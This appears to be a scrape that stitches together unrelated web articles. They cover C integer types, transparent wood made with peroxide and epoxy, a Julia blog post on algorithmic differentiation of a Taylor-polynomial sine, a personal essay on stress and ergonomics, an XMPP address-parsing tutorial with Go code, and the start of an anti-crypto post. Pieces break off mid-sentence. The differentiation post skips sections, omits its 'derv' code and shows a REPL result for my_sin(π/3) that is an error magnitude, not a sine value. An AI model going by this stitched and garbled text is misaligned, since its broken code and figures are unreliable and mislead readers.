<p>Also see <a href="http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/inttypes.h.html#tag_13_19_06">RATIONALE</a> included with <a href="http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/inttypes.h.html">inttypes.h</a> for reasons why using non-fixed-width types is unsafe. If you are truly smart enough to conceptualize <code>int</code> being 16 bits on some platforms and 32 bits on other platforms throughout your development while also testing all 16 bit and 32 bit edge cases for every place you use <code>int</code>, please feel free to use <code>int</code>.</p>
<p>For the rest of us who can’t hold entire multi-level decision tree platform specification hierarchies in our heads while writing fizzbuzz, we can use fixed width types and automatically have more correct code with much less conceptual hassle and much less required testing overhead.</p>
<p>Or, said more concisely in the specification: “the ISO C standard integer promotion rule can produce silent changes unexpectedly.”</p>
<p>Good luck with that.</p>
<h4 id="_one-exception-to-never-char">One Exception to never-<code>char</code></h4>
<p>The <em>only</em> acceptable use of <code>char</code> in 2016 is if a pre-existing API requires <code>char</code> (e.g. <code>strncat</code>, printf’ing “%s”, …) or if you’re initializing a read-only string (e.g. <code>const char *hello = "hello";</code>) because the C type of string literals (<code>"hello"</code>) is <code>char []</code>.</p>
<p>ALSO: In C11 we have native unicode support, and the type of …</p></div></div>

It could become an energy efficient building material in the future.</p>  <p>Wood is made of two basic ingredients: cellulose, which are tiny fibres, and lignin, which bonds those fibres together to give it strength.</p>  <p>Tear a paper towel in half and look closely along the edge. You will see the little cellulose fibres sticking up. Lignin is a glue-like material that bonds the fibres together, a little like the plastic resin in fibreglass or carbon fibre. The lignin also contains molecules called chromophores, which give the wood its brown colour and prevent light from passing through.</p>  <p>Early attempts to make transparent wood involved removing the lignin, but this involved hazardous chemicals, high temperatures and a lot of time, making the product expensive and somewhat brittle. The new technique is so cheap and easy it could literally be done in a backyard.</p>  <p>Starting with planks of wood a metre long and one millimetre thick, the scientists simply brushed on a solution of hydrogen peroxide using an ordinary paint brush. When left in the sun, or under a UV lamp for an hour or so, the peroxide bleached out the brown chromophores but left the lignin intact, so the wood turned white.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5902789.1612553066!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/transparent-wood-university-of-maryland.jpg 300w,https://i.cbc.ca/1.5902789.1612553066!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/transparent-wood-university-of-maryland.jpg 460w,https://i.cbc.ca/1.5902789.1612553066!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/transparent-wood-university-of-maryland.jpg 620w,https://i.cbc.ca/1.5902789.1612553066!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/transparent-wood-university-of-maryland.jpg 780w,https://i.cbc.ca/1.5902789.1612553066!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/transparent-wood-university-of-maryland.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5902789.1612553066!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/transparent-wood-university-of-maryland.jpg"></p></div><figcaption>Researchers demonstrated after brushing a coat of hydrogen peroxide on the opaque wood material, and exposing it to one hour of sunlight, it turns transparent.<!-- --> <!-- -->(Qinqin Xia, University of Maryland/Science Advances)</figcaption></figure></span></p>  <p>Next, they infused the wood with a tough transparent epoxy designed for marine use, which filled in the spaces and pores in the wood and then hardened.&nbsp;This made the white wood transparent.</p>  <p>You can see a similar effect by taking that same piece of paper towel, dip half of it in water and place it on a patterned surface.&nbsp;The white paper towel will become translucent with light passing through the water and cellulose fibres without being scattered by refraction.</p>  <p>The epoxy in the wood does an even better job, allowing 90 per cent of visible light to pass through.

The clear wood&nbsp;is lighter than glass, with better insulating properties, which is important because windows are a major source of heat loss in buildings. It also might take less energy to manufacture clear wood because there are no high temperatures involved.</p>  <p>Transparent wood could become an alternative to glass in energy efficient buildings, or perhaps coverings for solar panels in harsh environments. There could be no end of uses.</p>      <p>Many different types of wood, from balsa to oak, can be made transparent, and it doesn't matter if it is cut along the grain or against it. If the transparent wood is made a little thicker, it would be strong enough to become part of the structure of a building, so there could be entire transparent wooden walls.</p>  <p>While this technology has yet to&nbsp; be scaled up to industrial levels, the researchers say it has great potential as a new building material. In fact, they say that theoretically, an entire house could be made transparent. It is not clear why anyone would want to live in a transparent house, but for people who do, it would be OK to throw stones…</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5902787.1612553101!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/transparent-wood-qinqin-xia-university-of-maryland.jpg 300w,https://i.cbc.ca/1.5902787.1612553101!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/transparent-wood-qinqin-xia-university-of-maryland.jpg 460w,https://i.cbc.ca/1.5902787.1612553101!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/transparent-wood-qinqin-xia-university-of-maryland.jpg 620w,https://i.cbc.ca/1.5902787.1612553101!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/transparent-wood-qinqin-xia-university-of-maryland.jpg 780w,https://i.cbc.ca/1.5902787.1612553101!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/transparent-wood-qinqin-xia-university-of-maryland.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5902787.1612553101!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/transparent-wood-qinqin-xia-university-of-maryland.jpg"></p></div><figcaption>A researcher holds up a 10-centimetre long slab of the see-through wood.<!-- --> <!-- -->(Qinqin Xia, University of Maryland/Science Advances)</figcaption></figure></span></p>  <p>Images copyright Xia et al.&nbsp;<a href="https://creativecommons.org/licenses/by-nc/4.0/" rel="license">Creative Commons Attribution-NonCommercial license</a>,&nbsp;</p></span></p></div></div>]]>

      <p>Griewank and Walther’s 0th Rule of algorithmic differentiation (AD) states:</p>

<blockquote>
  <p>Algorithmic differentiation does not incur truncation error.</p>
</blockquote>

<p>(<a href="https://dl.acm.org/doi/book/10.5555/1455489">2008, “Evaluating Derivatives: Principles and Techniques of Algorithmic Differentiation”, Andreas Griewank and Andrea Walther.</a>)</p>

<p>In this blog post I will show you a case that looks like it does in fact incur truncation error.
Though this case will arguably be a misinterpretation of that rule.
This blog post will thus highlight why careful interpretation of the rule is necessary.
Further it will motivate why we need to often add more custom sensitivity rules (custom primitives) to our AD systems, even though you can AD anything with just a few basic rules.</p>

<p>Credit to <a href="https://mikeinnes.github.io/">Mike Innes</a> who pointed this out to me at JuliaCon 2018.

<p>We will start by implementing a simple forwards mode AD.
This implementation is based on <a href="https://juliadiff.org/ChainRulesCore.jl/dev/autodiff/operator_overloading.html#ForwardDiffZero">ForwardDiffZero from the ChainRules docs.</a>, but without ChainRules support.
Though it is also the simplest most stock-standard implementation once can conceive of.</p>

<h2 id="2-implement-sin-and-cos-for-demonstration-purposes">2. Implement Sin and Cos, for demonstration purposes</h2>

<p>Now we are going to implement the <code>sin</code> and <code>cos</code> functions for demonstration purposes.
<a href="https://github.com/JuliaLang/julia/blob/v1.5.3/base/special/trig.jl">JuliaLang has an implementation of <code>sin</code> and <code>cos</code> in Julia</a>, that could be ADed though by a source to source AD (like <a href="https://github.com/FluxML/Zygote.jl">Zygote.jl</a>).
But because it is restricted to <code>Float32</code> and <code>Float64</code> an operator overloading AD like ours can’t be used with it.
That’s Ok we will just code up a simple one using Taylor polynomials.
we know that eventually the code run does have to look something like this, since all operations are implemented in terms of <code>+</code>, <code>*</code> and <code>^</code>, <code>/</code>, bit-shifts and control-flow.
(Technically <a href="https://en.wikipedia.org/wiki/X86_instruction_listings#Added_with_80387">x86 assembly</a> does have a primitive for <code>sin</code> and <code>cos</code> but as far as I know no LibM actually uses them. There is a <a href="https://reviews.llvm.org/D36344">discussion of why LLVM</a> doesn’t ever emit them if you go looking)
The real code would include control flow to wrap around large values and stay close to zero, but we can skip that and just avoid inputting large values.</p>

<p>So using Taylor polynomials of degree 12 for each of them:</p>

<div><div><pre><code><span>my_sin</span><span>(</span><span>x</span><span>)</span> <span>=</span> <span>x</span> <span>-</span> <span>x</span><span>^</span><span>3</span><span>/</span><span>factorial</span><span>(</span><span>3</span><span>)</span> <span>+</span> <span>x</span><span>^</span><span>5</span><span>/</span><span>factorial</span><span>(</span><span>5</span><span>)</span> <span>-</span> <span>x</span><span>^</span><span>7</span><span>/</span><span>factorial</span><span>(</span><span>7</span><span>)</span> <span>+</span> <span>x</span><span>^</span><span>9</span><span>/</span><span>factorial</span><span>(</span><span>9</span><span>)</span> <span>-</span> <span>x</span><span>^</span><span>11</span><span>/</span><span>factorial</span><span>(</span><span>11</span><span>)</span>  <span># + 0*x^12</span>

<span>my_cos</span><span>(</span><span>x</span><span>)</span> <span>=</span> <span>1</span> <span>-</span> <span>x</span><span>^</span><span>2</span><span>/</span><span>factorial</span><span>(</span><span>2</span><span>)</span> <span>+</span> <span>x</span><span>^</span><span>4</span><span>/</span><span>factorial</span><span>(</span><span>4</span><span>)</span> <span>-</span> <span>x</span><span>^</span><span>6</span><span>/</span><span>factorial</span><span>(</span><span>6</span><span>)</span> <span>+</span> <span>x</span><span>^</span><span>8</span><span>/</span><span>factorial</span><span>(</span><span>8</span><span>)</span> <span>-</span> <span>x</span><span>^</span><span>10</span><span>/</span><span>factorial</span><span>(</span><span>10</span><span>)</span> <span>+</span> <span>x</span><span>^</span><span>12</span><span>/</span><span>factorial</span><span>(</span><span>12</span><span>)</span>
</code></pre></div></div>

<p>Check the accuracy
we know that  <code>sin(π/3) == √3/2</code>, and that <code>cos(π/3) == 1/2</code>
(note that yes, <code>π</code> and <code>√3/2</code> are  approximating here but they are very accurate one. And this doesn’t change the result that follows.)</p>
<div><div><pre><code><span>julia</span><span>&gt;</span> <span>my_sin</span><span>(</span><span>π</span><span>/</span><span>3</span><span>)</span>

<span>2.177769076183722e-11</span>
</code></pre></div></div>

<p>This is not terrible.
<code>cos</code> is slightly more accurate than <code>sin</code>. 
We have a fairly passable implementation of <code>sin</code> and <code>cos</code>.</p>

<h2 id="3-now-lets-do-ad">3. Now lets do AD.</h2>

<p>We know the derivative of <code>sin(x)</code> is <code>cos(x)</code>.
So if we take the derivative of <code>my_sin(π/3)</code> we should get <code>my_cos(π/3)≈0.5</code>.
<em>It should be as accurate as the original implementation, right?</em>
because Griewank and Walther’s 0th Rule:</p>

<blockquote>
  <p>Algorithmic differentiation does not incur truncation error.</p>
</blockquote>

<div><div><pre><code><span>julia</span><span>&gt;</span> <span>derv</span><span>(</span><span>my_sin</span><span>,</span> <span>π</span><span>/</span><span>3</span><span>)</span>
<span>0.4999999963909431</span>
</code></pre></div></div>
<p>Wait a second.
That doesn’t seem accurate, we expected 0.5, or at least something pretty close to that.
<code>my_cos</code> was accurate to $2 \times 10^{-11}$.
<code>my_sin</code> was accurate to $3 \times 10^{-10}$
How accurate is this:</p>
<pre><code>julia&gt; abs(derv(my_sin, π/3) - 0.5)
3.609056886677564e-9
</code></pre>

<p>What went wrong?</p>

<p>Now, I did implement an AD from scratch there.
So maybe you are thinking that I screwed it up.
Maybe a reverse mode AD would not suffer from this problem; or maybe one that uses source to source?
Lets try some of Julia’s many AD systems then.</p>

<p>Ok, I just tried <strong>7</strong> AD systems based on totally different implementations.
I mean <a href="https://github.com/wsmoses/Enzyme.jl/">Enzyme</a> is reverse mode running at the LLVM level.
Totally different from <a href="https://github.com/JuliaDiff/ForwardDiff.jl">ForwardDiff</a> which is the more mature version of the forward mode operator overloading AD I coded above.
Every single one agreed with my result, up to <a href="https://en.wikipedia.org/wiki/Unit_in_the_last_place">1 ULP</a>.
I think that last digit changing is probably to do with order of addition (IEEE floating point math is funky), but that is another blog-post.
So I think we can reliably say that this is what an AD system will output when asked for the derivative of <code>my_sin</code> at <code>π/3</code>.</p>

<h2 id="5-explanation">5. Explanation</h2>

<p>Why does AD seem to be incurring truncation errors?
Why is the derivative of <code>my_sin</code> much less accurate than <code>my_cos</code>?</p>

<p>The AD system is (as you might have surmised) not incurring truncation errors.
It is giving us exactly what we asked for, which is the derivative of <code>my_sin</code>.
<code>my_sin</code> is a polynomial.
The derivative of the polynomial is:</p>
<div><div><pre><code><span>d_my_sin</span><span>(</span><span>x</span><span>)</span> <span>=</span> <span>1</span> <span>-</span> <span>3</span><span>x</span><span>^</span><span>2</span><span>/</span><span>factorial</span><span>(</span><span>3</span><span>)</span> <span>+</span> <span>5</span><span>x</span><span>^</span><span>4</span><span>/</span><span>factorial</span><span>(</span><span>5</span><span>)</span> <span>-</span> <span>7</span><span>x</span><span>^</span><span>6</span><span>/</span><span>factorial</span><span>(</span><span>7</span><span>)</span> <span>+</span> <span>9</span><span>x</span><span>^</span><span>8</span><span>/</span><span>factorial</span><span>(</span><span>9</span><span>)</span> <span>-</span> <span>11</span><span>x</span><span>^</span><span>10</span><span>/</span><span>factorial</span><span>(</span><span>11</span><span>)</span>
</code></pre></div></div>
<p>which indeed does have</p>
<div><div><pre><code><span>julia</span><span>&gt;</span> <span>d_my_sin</span><span>(</span><span>π</span><span>/</span><span>3</span><span>)</span>
<span>0.4999999963909432</span>
</code></pre></div></div>
<p><code>d_my_sin</code> is a lower degree polynomial approximation to <code>cos</code> than <code>my_cos</code> was, so it is less accurate.
Further, you can see that while n-derivative of <code>sin</code> is always defined as <code>sin(x+n*π/2)</code>, as we keep taking derivatives of the polynomial approximations terms keep getting dropped.
AD is making it smoother and smoother til it is just a flat <code>0</code>.</p>

<p>The key take away here is that <em>the map is not the territory</em>.
Most nontrivial functions on computers are implemented as some function that that approximates (<em>the map</em>) the mathematical ideal (<em>the territory</em>).
Automatic differentiation gives back a completely accurate derivative of the that function (<em>the map</em>) doing the approximation.
<em>Furthermore, the accurate derivative of an approximation to the idea (e.g <code>d_my_sin</code>), is less accurate than and approximation to the (ideal) derivative of the ideal (e.g. <code>my_cos</code>).</em>
There is no truncation error in the work the AD did; but there is a truncation error in the sense that we are now using a more truncated approximation that we would write ourselves.</p>

<p>So what do?
Well-firstly, do you want to do anything?
Maybe the derivative of the approximation is more useful.
(I have been told that this is the case for some optimal control problems).
But if we want to fix it can we?
Yes, the answer is to insert domain knowledge, telling the AD system directly what the approximation to the derivative of the ideal is.
The AD system doesn’t know its working with an approximation, and even if it did, it doesn’t know what the idea it is approximating is.
The way to tell it is with a custom primitive i.e. a custom sensitivity rule.
This is what the ChainRules project in Julia is about, being able to add custom primitives for more things.</p>

<p>Every real AD system already has a primitive for <code>sin</code> built in
(which is one of the reasons I had to define my own above).
but it won’t have one for every novel system you approximate.
E.g. for things defined in terms of differential equation solutions or other iterative methods.</p>

<p>We can define in our toy AD at the start this custom primitive via:</p>
<div><div><pre><code><span>function</span><span> my_sin</span><span>(</span><span>x</span><span>::</span><span>Dual</span><span>)</span>
    <span>return</span> <span>Dual</span><span>(</span><span>my_sin</span><span>(</span><span>primal</span><span>(</span><span>x</span><span>)),</span> <span>partial</span><span>(</span><span>x</span><span>)</span> <span>*</span> <span>my_cos</span><span>(</span><span>primal</span><span>(</span><span>x</span><span>)))</span>
<span>end</span>
</code></pre></div></div>
<p>and it does indeed fix it.</p>
<div><div><pre><code><span>julia</span><span>&gt;</span> <span>derv</span><span>(</span><span>my_sin</span><span>,</span> <span>π</span><span>/</span><span>3</span><span>)</span>
<span>0.5000000000217777</span>

<span>julia</span><span>&gt;</span> <span>abs</span><span>(</span><span>derv</span><span>(</span><span>my_sin</span><span>,</span> <span>π</span><span>/</span><span>3</span><span>)</span> <span>-</span> <span>0.5</span><span>)</span>
<span>2.177769076183722e-11</span>
</code></pre></div></div>

<h3 id="bonus-will-symbolic-differentiation-save-me">Bonus: will symbolic differentiation save me?</h3>

<p>Most symbolic differentiation systems will have a rule just like the custom primitive for <code>sin</code> built in.
It basically has to do something like this, where-as a forward/reverse AD system could do as we did and fall back to <code>+</code> and <code>*</code>.
<em>But</em>, it certainly would <em>not</em> help you to apply symbolic AD to an approximation, that would give exactly the result we derived for <code>d_sin</code> above.</p>

<p>More interestingly, languages where symbolic differentiation is common tend also th have interesting representations of functions in the first place.
This does open up avenues for interesting solutions.
A suitably weird language could be using representation of <code>sin</code> that is a lazily evaluated polynomial of infinite degree underneath.
And in that case there is a rule for its derivative, expressed in terms of changes to its coefficient generating function; which would also give back a lazily evaluated polynomial.
I don’t know if anyone does that though; I suspect it doesn’t generalized well.
Further, for a lot of things you want to solving systems via iterative methods, and these …</p></div></div>

<p>I want to talk about stress. I tweeted this last night:&nbsp;</p>



<figure><div>

</div></figure>



<p>This is what stress can do — I cannot lift laundry detergent “normally” with my right arm.&nbsp;</p>



<p>In fact, it turns out that your trapezius muscle allows you to do many things such as</p>



<ul><li>Reach for things in a cabinet</li><li>Adjust the rear-view mirror or radio knob in a car</li><li>Wash dishes</li><li>To a certain extent, use a fork to eat food.&nbsp;</li></ul>



<p>Without this muscle, many things are challenging. </p>



<p>One of my founders even texted me right after I posted this video if I was stressed out about his latest investor report! Hah!&nbsp;</p>



<p>This video isn’t about stress from fundraising (we’re not raising right now anyway) or from having portfolio companies who are doing well or not well.&nbsp;In fact, the reason I decided to write about this so publicly is not to garner sympathy (but thank you for all the well wishes!) but to show to everyone what can happen because of stress — <em><strong>and that this can happen to anyone</strong></em>. </p>



<p>In fact, all of this started when I was 23 — not just recently. At 23, I ended up in a hospital in Tokyo after having terrible neck pain, where I was living and working at the time. I was fortunate to have excellent care, but the bad news was that I had a pinched nerve and I would likely live with this pain and weird issues forever — though it could be <em><strong>managed with proper diet, exercise, and low stress</strong>.&nbsp;</em></p>



<p>The likely combined cause?&nbsp;Years of </p>



<ul><li>Poor posture (sitting and standing)</li><li>Poor ergonomics using computers</li><li>Using computers too much (by age 23!)</li><li>Slinging too many backpacks filled with heavy books during high school</li><li>Combined with stress</li></ul>



<p>In other words, there wasn’t any particular trauma or incident. But guess what? 80% of people I know have some permutation of the above.&nbsp;</p>

<p>Over the years, I’ve been able to manage this chronic issue pretty well. I started taking up swimming, even though I was never a swimmer in school (YouTube can teach you so many things!). And, I have bought so many ergonomic keyboards over the years, that I’m sure single-handedly propping the Amazon share price up.&nbsp;</p>



<p>But every once in a while, stress creeps up and sends me back into health issues. In 2009, when I was starting my company, my arms and hands were tingling and it hurt to type. In 2011, when I was fundraising, I felt like someone was constantly poking me with pins all over. Some of the best physicians who were specialists in this area could not find anything additional wrong — miraculously when I stopped fundraising, the prickly feeling left! And fast forward to today, the combination of shelter-in-place/little kids/handling of the COVID-19 situation/police brutality/racism/and even the murder hornets are all fairly stressful! (I’m sure I’m not the only one here who thinks this)</p>



<p>As it would turn out over half of my friends who are tech entrepreneurs or recovering tech entrepreneurs have stress-induced issues. Repetitive strain issues, tingling feelings, shingles, IBS or other chronic stress-related problems, etc. It’s seemingly quite common, and while mental health is starting to be discussed, the physical ramifications of stress are rarely discussed publicly.&nbsp;</p>



<p>And once you have one of these issues, with proper care, you’ll be able to manage through it, but you’ll get flare ups from time to time as stress comes and goes. You’ll never be quite the same.&nbsp;</p>



<p>If I had to rewind the clock, what would I tell myself?</p>



<p><strong>Never use a computer or iPad in an un-ergonomic way</strong></p>



<ul><li>No laptop usage on the couch</li><li>Buy an ergonomic mouse &amp; keyboard that fits your hands (the built-in ones on the Macbook Air are way too hard)</li><li>Buy an external monitor and set it to eye-level</li><li>Set up proper typing and mousing heights</li><li>Use a tablet pen with an iPad</li></ul>



<p><strong>Do a stress-relieving exercise everyday – even for 5 min</strong>. Once we leave school and become adults — there’s no PE or fun sports forced upon you to keep you accountable. And, for some (such as myself), forcing exercise becomes challenging. But even just a few jumping jacks a day can do wonders. In fact, jumping jacks are near impossible for me to do now.&nbsp;</p>

<p><strong>Always lift things in an ergonomic way</strong> – not just weights but everything. In school, I used to sling a lot of books over my shoulder. (Maybe I should have studied less? My HS schoolmates who had those wheelie backpacks got it right.)&nbsp;</p>



<p><strong>Sprint when you need to but jog when you don’t</strong> – in building a startup, sometimes you need to sprint — it’s inevitable. But understanding when you need to sprint and when you can jog is the key. As <a href="https://twitter.com/MacConwell/status/1282354308097474561?s=20">Mac Conwell discusses here</a>, most people try to sprint all the time, and that’s just not sustainable.&nbsp;</p>



<p>Jog mode doesn’t mean do nothing, but jog mode means reducing really extraneous things. Standing or sitting in front of a computer for hours on end isn’t what humans were meant to do. Reducing extraneous Zoom mtgs &amp; calls, extraneous emails, etc and really focusing on health (exercise + mindfulness + stress reduction + good diet) during these times is what jog mode means. Prioritizing and only focusing on just 1 work thing for a “normal” working day is what jog mode means. </p>



<p>A lot of people wonder why not that many builders go back and build again. My hunch is that it’s this: they have some sort of chronic ailment that prevents them from being in “go-go-go mode” all the time and don’t think they can build a fast-growth company if they are not in “go-go-go mode” all the time. I think if we didn’t have “go-go-go mode” all the time as the norm expectation, we would see more multi-repeat builders. There’s this sense that if you’re not in “go-go-go mode” all the time, you’re not ambitious, but I think the right analogy is akin to marathon runners. Most people can’t run marathons everyday. You need to slow on some days and rest too. But when it counts, you need to be all out there running your race. Understanding what day is your race and what days are your training are critical, but often we don’t understand that. And if you get injured, you’ll never be the same. We have so many former athletes who are now injured who don’t want to run races again because they think they won’t win.</p>



<p>For me, with my ailments, I literally cannot type as much as I used to — I need days of typing rest. That used to frustrate me to no end. But over time, I’ve come to learn what is important to type, what emails to hold off on, and more recently, I’ve started building homegrown tools to allow me to do more with less typing.&nbsp;</p>



<p>As a parent, I actually care way less about screen time and more about ergonomics. When my 3 year old said his back hurt from looking down at the screen, I was/am really hoping he was exaggerating (hard to tell), and it would not surprise me if this upcoming generation who will grow up on more portable devices that easily allow for poor posture and ergonomics will have even more chronic problems. I think ergonomics and posture should be taught in schools as part of PE or health.&nbsp;</p>



<p>In conclusion – take care of your stress and health — you only have one shot, and once your health is gone, it’s hard to be the same again.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
		<p>This post is copied from an article I originally wrote for <a href="https://stackoverflow.com/documentation">Stack Overflow
Documentation</a>, a wiki-style documentation site.
As it is <a href="https://meta.stackoverflow.com/questions/354217/sunsetting-documentation">no longer available</a>, I have copied it here and modified it to work in
blog post form.</p>
<hr>
<p>XMPP addresses, more commonly known as <abbr title="Jabber Identifiers">JIDs</abbr>, are defined in <a href="https://tools.ietf.org/html/rfc7622">RFC 7622</a> and identify clients, servers,
and other entities on the XMPP network.
They look like an email address, but sometimes have an optional “resourcepart”
at the end that identifies a particular client logged in as the account
represented by the rest of the address (since XMPP may have multiple clients
connected per account).
For example, my JID with a resourcepart <code>blog</code> would be:</p>
<pre><code>sam@samwhited.com/blog
</code></pre>
<p>Unlike email where the account is the lowest level of entity that can be
addressed, individual clients on the XMPP network are globally addressable
thanks to the addition of the resourcepart.</p>
<h2 id="jid-types">JID Types</h2>
<p>JIDs are sometimes broken down into two types: the “full JID” and the “bare
JID”.
Full JIDs always have a resource part and uniquely identify an individual client
or session on the network:</p>
<ul>
<li><code>romeo@example.org/orchard</code></li>
<li><code>example.org/da863ab</code></li>
</ul>
<p>Bare JIDs <strong>never</strong> have a resourcepart and identify an account or host on the
network:</p>
<ul>
<li><code>romeo@example.org</code></li>
<li><code>example.org</code></li>
</ul>
<p>From a protocol perspective nothing can be gleaned from the lack or presence of
a resourcepart or localpart other than the fact that this is an account which
may have multiple network entities with current sessions or that it addresses a
specific entity.</p>
<h2 id="splitting-a-jid">Splitting a JID</h2>
<p>To split a JID into its component parts (the localpart, domainpart, and
resourcepart), the following algorithm should be used (where the localpart is
represented by <code>lp</code>, the resourcepart by <code>rp</code>, and the domainpart by <code>dp</code> and ∈
is used to check if the given character is included in the string):</p>
<figure><a href="https://blog.samwhited.com/img/jid_split.png">
    <img src="https://d33wubrfki0l68.cloudfront.net/f9e5d76c2f5f8206866030d825f781ec3f2b4188/365c9/img/jid_split.png" alt="JID splitting flow chart" width="500"> </a>
</figure>

<p>In textual form:</p>
<ol>
<li>If the JID does not contain a “/”, the resourcepart is the empty string.
Discard everything after and including the “/” and goto 5.</li>
<li>Otherwise split on the first slash.</li>
<li>If the part after the slash was the empty string, error.</li>
<li>Otherwise the resourcepart is the part after the slash.</li>
<li>If the remainder of the JID does not contain an “@”, the localpart is empty
and the domainpart is the remainder of the JID. Goto 9.</li>
<li>Otherwise, split on the “@”.</li>
<li>If the part before the “@” is the empty string, error.</li>
<li>Otherwise the domainpart is localpart is the part before the “@” and the
domainpart is the part after the “@”.</li>
<li>Trim any “.” suffix from the domainpart.</li>
<li>Done!</li>
</ol>
<p>Note that the localpart and resourcepart are optional and may result in empty
strings (you may have a jid that is just a domainpart).</p>
<p>And finally, let’s see an example in code form using Go:</p>
<p>In Go, the <a href="https://pkg.go.dev/mellium.im/xmpp/jid"><code>mellium.im/xmpp/jid</code></a> package implements operations on JIDs.
To Split a JID string into its component parts the <a href="https://pkg.go.dev/mellium.im/xmpp/jid#SplitString"><code>SplitString</code></a> function may
be used:</p>
<pre><code>lp, dp, rp, err := SplitString("romeo@example.net")
</code></pre><p>No validation is performed by <code>SplitString</code> and the parts are not guaranteed to
be valid.</p>
<p>To manually split a string without depending on the <code>jid</code> package, the
underlying code (with annotations from RFC 7622) looks like this:</p>
<pre><code>func SplitString(s string) (localpart, domainpart, resourcepart string, err error) {
	// RFC 7622 §3.1.  Fundamentals:
	//
	//    Implementation Note: When dividing a JID into its component parts,
	//    an implementation needs to match the separator characters '@' and
	//    '/' before applying any transformation algorithms, which might
	//    decompose certain Unicode code points to the separator characters.
	//
	// so let's do that now. First we'll parse the domainpart using the rules
	// defined in §3.2:
	//
	//    The domainpart of a JID is the portion that remains once the
	//    following parsing steps are taken:
	//
	//    1.  Remove any portion from the first '/' character to the end of the
	//        string (if there is a '/' character present).
	sep := strings.Index(s, "/")

	if sep == -1 {
		resourcepart = ""
	} else {
		// If the resource part exists, make sure it isn't empty.
		if sep == len(s)-1 {
			err = errNoResourcepart
			return
		}
		resourcepart = s[sep+1:]
		s = s[:sep]
	}

	//    2.  Remove any portion from the beginning of the string to the first
	//        '@' character (if there is an '@' character present).

	sep = strings.Index(s, "@")

	switch {
	case sep == -1:
		// There is no @ sign, and therefore no localpart.
		localpart = ""
		domainpart = s
	case sep == 0:
		// The JID starts with an @ sign (invalid empty localpart)
		err = errNoLocalpart
		return
	default:
		domainpart = s[sep+1:]
		localpart = s[:sep]
	}

	// We'll throw out any trailing dots on domainparts, since they're ignored:
	//
	//    If the domainpart includes a final character considered to be a label
	//    separator (dot) by [RFC1034], this character MUST be stripped from
	//    the domainpart before the JID of which it is a part is used for the
	//    purpose of routing an XML stanza, comparing against another JID, or
	//    constructing an XMPP URI or IRI [RFC5122].  In particular, such a
	//    character MUST be stripped before any other canonicalization steps
	//    are taken.

	domainpart = strings.TrimSuffix(domainpart, ".")

	return
}
</code></pre><h2 id="validating-a-jid">Validating a JID</h2>
<p>Unlike emails, JIDs were defined with Internationalization (i18n) in mind using
the Preparation, Enforcement, and Comparison of Internationalized Strings
(PRECIS) framework.
PRECIS is defined in <a href="https://tools.ietf.org/html/rfc8264">RFC 8264</a> and is a framework for comparing strings safely
in a variety of contexts.
For instance, imagine you have registered the nickname “Richard IV” (Latin
capital letters I, Vee) in a group chat: Using PRECIS the chat application could
ensure that no one else comes along and registers the nickname “Richard Ⅳ”
(Unicode Roman Numeral 4) and uses it to impersonate you.</p>
<p>The algorithm for validating a JID that has already been split into its
localpart, domainpart, and resourcepart is as follows:</p>
<figure><a href="https://blog.samwhited.com/img/jid_validate.png">
    <img src="https://d33wubrfki0l68.cloudfront.net/7967a0249ff5178a2ab089dfe1c38ecd9cc99b5e/c3408/img/jid_validate.png" alt="JID validation flow chart" width="500"> </a>
</figure>

<p>In textual form:</p>
<ol>
<li>Take the localpart, domainpart, and resourcepart as the inputs.</li>
<li>If the localpart or resourcepart are not valid UTF-8, error.</li>
<li>Otherwise run the IDNA “To Unicode” algorithm on the domainpart.</li>
<li>If the output domainpart is not valid UTF-8, error.</li>
<li>Otherwise run the PRECIS “Username Case Mapped” profile on the localpart, and
the “Opaque String” profile on the resource part.</li>
<li>Perform other validation steps (in no particular order).</li>
</ol>
<p>The final <code>Validations</code> step should perform the following actions (in no
particular order):</p>
<ul>
<li>Check that the localpart is less than 1024 bytes.</li>
<li>Check that the localpart does not contain any any of the following</li>
<li>characters: <code>"&amp;'/:&lt;&gt;@</code>.</li>
<li>Check that the resourcepart is less than 1024 bytes.</li>
<li>Check that the domainpart is greater than zero bytes and less than 1024</li>
<li>bytes (and possibly validate that parts of the domainpart meet hostname,</li>
<li>DNS, or IP address requirements as appropriate).</li>
<li>If the domainpart is a valid IPv6 address, ensure that it uses bracketed
notation (eg. <code>[::1]</code> instead of <code>::1</code>).</li>
</ul>
<h2 id="conclusion">Conclusion</h2>
<p>As a user of XMPP most of the time addresses will just look like emails and you
won’t need to ever see them except occasionally adding one to your address book.
Even as a developer of XMPP you mostly won’t need to worry about the details of
splitting or validating JIDs as robust libraries for handling XMPP addresses
exist in most or all popular programming languages.
However, sometimes it’s fun to take a bit of a dive into seemingly simple
technologies and know how they work under the hood.
Hopefully this article gave you a deeper appreciation of how to handle addresses
in XMPP.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>This post was inspired by a question on Reddit: How much of your investment portofolio is crypto?</p><p>Well, my answer is 0%, and it will remain 0% forever.</p><p>I don't see the value in it, and the people who advocate for them are hypocrites: they say they get into
crypto as a rebellion act against the current FIAT system that is controlled by governments, while
day-dreaming about selling it for a huge profit (in FIAT currency).
Every advocate promotes holding, which is not what a currency is for: currencies are meant to be
